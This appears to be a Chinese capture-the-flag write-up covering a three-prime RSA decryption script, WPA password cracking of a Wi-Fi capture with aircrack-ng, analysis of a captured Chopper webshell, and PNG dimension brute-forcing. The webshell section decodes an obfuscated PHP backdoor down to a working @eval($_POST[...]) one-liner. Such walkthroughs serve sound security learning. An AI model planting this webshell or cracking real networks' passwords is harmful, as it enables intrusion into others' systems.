**0x01.1 Crypto-RSA**

![](../Images/f3accd7ad8e8c92354f0a7cc97550522.png)![](../Images/c005bd25c5096dd3100b109ad7e09798.png)

这里n不大，使用工具msieve (https://sourceforge.net/projects/msieve/) 可以直接分解，分解得到：

n=782758164865345954251810941\*810971978554706690040814093\*1108609086364627583447802163

![](../Images/4148390795d8bcbddff57081d90d7a0f.png)

注意通常RSA中n的分解只有两个素因数p\*q，phi\_n=(p-1)\*(q-1), 这里n有三个素因数，因此phi\_n=(p-1)\*(q-1)\*(r-1)，解密脚本如下：

import gmpy2

(p, q, r)=(782758164865345954251810941, 810971978554706690040814093, 1108609086364627583447802163)

n=p\*q\*r

e=gmpy2.mpz(59159)

p1=gmpy2.mpz(p)

q1=gmpy2.mpz(q\*r)

c=gmpy2.mpz(449590107303744450592771521828486744432324538211104865947743276969382998354463377)

phi\_n=(p-1)\*(q-1)\*(r-1)

d=gmpy2.invert(e, phi\_n)

m=pow(c,d,n)

print hex(m)\[2:\].decode("hex")

运行得到：flag{1e257b39a25c6a7c4d66e197}

![](../Images/92b334ee54eaa4940a11b4fff4c8f4be.png)

  

  

**0x02.0 Misc-Wifi**

![](../Images/f3accd7ad8e8c92354f0a7cc97550522.png)

提示：Wifi密码为6666XXXX

使用wireshark打开Wifi.pcap包，可以看到一个SSID=flag{05password-f059-448f}，这个应该是要破解Wifi密码的SSID.

![](../Images/d4d1e5d0470899c5e388c82597babcdf.png)

使用工具生成66660000-66669999的字典，然后用aircrack-ng (http://www.aircrack-ng.org/) 破解WPA密码

aircrack-ng.exe -e "flag{05password-f059-448f}" -w pass.dic WiFi.pcap

![](../Images/2101fe753021192b10bd1ea8c709a479.png)

Wifi密码为66668912，然后可以用airdecap-ng对原pcap包进行解密，成功解密60个WPA包。

airdecap-ng.exe -e "flag{05password-f059-448f}" -p 66668912 WiFi.pcap

![](../Images/0eeaed968b4824e71e17676f7c2ce74c.png)

但是解密后的pcap包中没有任何flag痕迹，脑洞一开，替换SSID中的password为Wifi密码，得到flag{0566668912-f059-448f}

  

  

**0x02.1 Misc-Webshell**

![](../Images/f3accd7ad8e8c92354f0a7cc97550522.png)

Wireshark打开pcap包，题目要求提交菜刀连接密码，直接使用http协议进行过滤：

![](../Images/486387d67a988a41d8d435ec2c7e9cdd.png)

可以看到webshell.php就是一个菜刀马，cmd是密码，但是提交不对，肯定没这么简单。

![](../Images/820ed264790930dcfd19f72133ab927c.png)

继续查看webshell.php的操作，后续可以看到有压缩打包了一个路径，并下载了该压缩包。

![](../Images/3707892514ade48ec9cf9506cbabee3b.png)![](../Images/b16b0dcd9efbc3a675ea458d4b3ed468.png)

那么所谓的菜刀webshell可能就在此压缩包内。通过文件----导出对象----HTTP对象----选中最后一个8809kB的数据包进行保存。保存后需去除文件头和尾的菜刀标识符“->|”和“|<-”. 解压后用D盾进行目录扫描，发现webshell.

![](../Images/9e849351d6f61edf33b7fd9aa1d69467.png)![](../Images/b5542f5d09402fd9c20bbdd810f1852a.png)

对中间的字符串解hex得到：

http://127.0.0.1/wp-content/themes/twentysixteen/js/ui.js

文件内容：

QHJpbnkoJF9DQkZHWyJvN3BxbnMwMzBxNTlzc3JxNzMxcXBuMDFuMTU2NXJybyJdKQ==

解base64得到：@riny($\_CBFG\["o7pqns030q59ssrq731qpn01n1565rro"\])，再进行一次ROT13解码得到：

@eval($\_POST\["b7cdaf030d59ffed731dca01a1565eeb"\])，此即flag.

**0x03.0 Steg-PNG**

![](../Images/f3accd7ad8e8c92354f0a7cc97550522.png)

一张PNG图片，file和binwalk看了下是张正常图片

![](../Images/cea47bd2fae5c8a43ceb19536ba2d49a.png)

看下文件头有问题没有：如下图我们计算下CRC校验符不符合

![](../Images/62fec432385f6c80a829d1d26d418bd9.png)

用stegsolve可以看出确实CRC校验有问题，实际应该为0x2c44c87c

![](../Images/06fe9a5cc49566c8d7930219f83ba1df.png)

下面爆破下实际的文件尺寸，脚本如下

import binascii

def crc(s):

    return hex(binascii.crc32(s) & 0xffffffff)\[2:-1\]

for i in xrange(2000):

    for j in xrange(2000):

        width = "{:0>8x}".format(i)

        height = "{:0>8x}".format(j)

        cc = crc("49484452{0}{1}0802000000".format(width, height).decode("hex"))

        if cc == "53d1578a":

            print i, j

运行得到宽为1024 (0x0400) 高为625 (0x0271)，修改完高度后，可以在stegsolve中看到二维码，扫描得到f ag{affe5937-51d1-4182-87a4-bb4bcf038aea}

![](../Images/95a47f903a32cda70e8212d261b6a47b.png)
